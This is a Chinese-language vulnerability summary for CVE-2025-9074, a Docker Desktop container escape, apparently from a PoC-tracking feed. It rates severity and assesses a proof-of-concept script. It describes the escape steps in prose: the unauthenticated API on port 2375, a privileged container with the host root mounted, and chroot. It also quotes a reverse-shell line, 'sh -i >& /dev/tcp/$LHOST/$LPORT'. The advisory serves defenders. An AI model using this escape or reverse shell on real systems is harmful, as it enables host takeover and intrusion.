## CVE-2025-9074 - Docker Desktop (Windows & macOS) 容器逃逸/越权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/越权访问

**影响应用:** Docker Desktop (Windows & macOS)

**危害等级:** 高危 (Critical)

**CVSS评分:** 9.3

**影响版本:** Docker Desktop 4.34.2 之前的版本

**利用条件:** 攻击者需在本地 Linux 容器中执行代码；Docker Desktop 默认配置下子网 192.168.65.7:2375 未受访问控制保护

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

POC有效性分析：该POC脚本是一个功能完备的Bash利用工具，通过直接调用Docker Engine API实现从容器到宿主机的逃逸。分析显示，脚本通过curl工具访问Docker Desktop在内部子网（192.168.65.7）默认开启的2375端口。该端口为Docker Engine API接口，在漏洞版本中未实施有效的隔离和认证。脚本首先获取宿主机上的可用镜像，随后调用/containers/create接口创建一个特权容器。核心利用点在于'HostConfig'参数：脚本将宿主机的根目录（/）挂载到新容器的/host目录下，并开启'Privileged'（特权模式）和'NetworkMode': 'host'。这种配置允许新容器完全访问宿主机文件系统。最后，脚本通过chroot切换根目录到挂载的宿主机路径，并执行反弹shell。经评估，该POC逻辑清晰，完全符合CVE-2025-9074的漏洞原理，在未修复的环境中具有极高的成功率。利用步骤：1. 在受影响的Docker Desktop环境内运行一个标准的Linux容器。2. 在容器内执行exploit.sh，指定监听者IP（LHOST）和端口（LPORT）。3. 脚本自动探测192.168.65.7:2375接口。4. 脚本检索本地镜像并创建一个挂载了宿主机根目录的特权容器。5. 脚本启动容器并触发chroot反弹shell。6. 攻击者在监听端获得宿主机的root级别权限。投毒风险分析：该POC代码本身表现为标准的防御性安全研究工具，其代码逻辑透明，使用了标准的Bash语法和curl、grep等系统命令，未发现混淆、动态加密下载或异常的外部通信行为。脚本中的核心载荷 'sh -i >& /dev/tcp/$LHOST/$LPORT' 是典型的验证性反弹shell，不属于隐蔽后门。然而，从威胁情报角度看，该漏洞利用门槛极低且破坏力巨大（直接获取宿主机控制权），因此该POC极易被恶意攻击者封装进伪装的开源项目、自动化运维工具或Docker镜像中。投毒风险主要来源于第三方分发渠道，而非代码本身。目前的投毒风险评级为15%，属于较低水平，主要因为代码的可读性极高，任何具备基础安全知识的人员均能一眼识别其敏感行为，但在复杂的CI/CD流程或自动化脚本集成中，仍需警惕恶意篡改后的变种代码植入。

**项目地址:** [https://www.freebuf.com/articles/vuls/445648.html](https://www.freebuf.com/articles/vuls/445648.html)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
